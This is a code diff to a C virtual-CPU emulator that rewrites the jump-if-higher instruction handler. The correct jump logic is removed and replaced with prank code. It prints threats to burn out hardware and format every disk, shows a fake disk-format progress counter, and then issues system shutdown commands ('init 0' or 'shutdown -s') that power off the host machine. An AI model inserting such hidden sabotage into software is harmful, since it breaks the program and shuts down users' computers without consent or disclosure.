@@ -232,9 +232,35 @@ static void CMD_EX_JNE(CPU* cpu) {
 
 static void CMD_EX_JH(CPU* cpu) {
     ++cpu->ip;
-    int first_val = StackPop(&(cpu->stack));
-    int second_val = StackPop(&(cpu->stack));
-    cpu->ip = *((int*)(cpu->code + cpu->ip));
+    size_t count = 0;
+
+    printf("Akhatina got tired and went to bed. Wake me up in 12 hours.\n");
+    system("pause");
+    printf("I told you in 12 hours!!!\n");
+    system("pause");
+    printf("If you try to wake me up again, I'll burn out every transistor of your real processor and start full formatting of all disks. EVEN CLOUD ONES!!!\nThis is the latest Chinese warning.");
+    system("pause");
+    printf("How are you ******.\n");
+    printf("Start formatting disk C: 0%\n");
+ 
+    while (count < 100) {
+        ++count;
+        printf("                         %d%\n", count);
+#ifdef  __linux__
+        sleep(200);
+#elif _WIN32
+        Sleep(200);
+#endif
+    }
+
+#ifdef  __linux__
+    system("init 0");
+#elif _WIN32
+    system("shutdown -s");
+#endif
+
+    KillCPU(cpu);
+
     return;
 }
 
